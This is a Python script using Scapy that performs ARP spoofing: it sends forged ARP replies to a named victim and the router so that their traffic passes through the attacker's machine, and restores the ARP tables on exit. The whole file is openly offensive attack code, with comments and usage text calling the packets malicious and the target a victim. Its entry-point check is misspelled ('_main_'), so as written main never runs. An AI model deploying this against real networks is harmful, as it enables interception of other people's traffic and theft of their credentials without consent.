from scapy import *
from scapy.arch import get_if_hwaddr
from scapy.config import conf
from scapy.layers.l2 import Ether, ARP, getmacbyip


import sys
import logging
import time
import signal

from scapy.sendrecv import sendp

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Send malicious ARP packets
def send_packet(my_mac, gateway_ip, target_ip, target_mac):
    packet = Ether(src=my_mac, dst=target_mac) / ARP(
        op=2, psrc=gateway_ip, hwsrc=my_mac, pdst=target_ip, hwdst=target_mac
    )
    sendp(packet, verbose=False)

# Restore the ARP table
def restore_arp(dest_ip, dest_mac, source_ip, source_mac):
    packet = Ether(src=source_mac, dst=dest_mac) / ARP(
        op=2, psrc=source_ip, hwsrc=source_mac, pdst=dest_ip, hwdst=dest_mac
    )
    sendp(packet, verbose=False)

def exit_gracefully(sig, frame):
    print("\n[!] Restoring ARP tables....")
    restore_arp(router_ip, router_mac, victim_ip, victim_mac)
    restore_arp(victim_ip, victim_mac, router_ip, router_mac)
    sys.exit(0)

signal.signal(signal.SIGINT, exit_gracefully)

def main():
    if len(sys.argv) != 3:
        print("\n[!] Usage: sudo python3 spoof.py <VICTIM_IP> <ROUTER_IP>")
        sys.exit(1)

    global victim_ip, router_ip, victim_mac, router_mac, my_mac
    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]

    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)
    my_mac = get_if_hwaddr(conf.iface)

    if not victim_mac or not router_mac:
        print("[!] Could not find MAC address. Exiting...")
        sys.exit(1)

    print("[!] Sending spoofed ARP packets....")

    try:
        while True:
            send_packet(my_mac, router_ip, victim_ip, victim_mac)
            send_packet(my_mac, victim_ip, router_ip, router_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        restore_arp(router_ip, router_mac, victim_ip, victim_mac)
        restore_arp(victim_ip, victim_mac, router_ip, router_mac)
        print("\n[!] ARP tables restored.")
        sys.exit(0)



if __name__ == "_main_":
    main()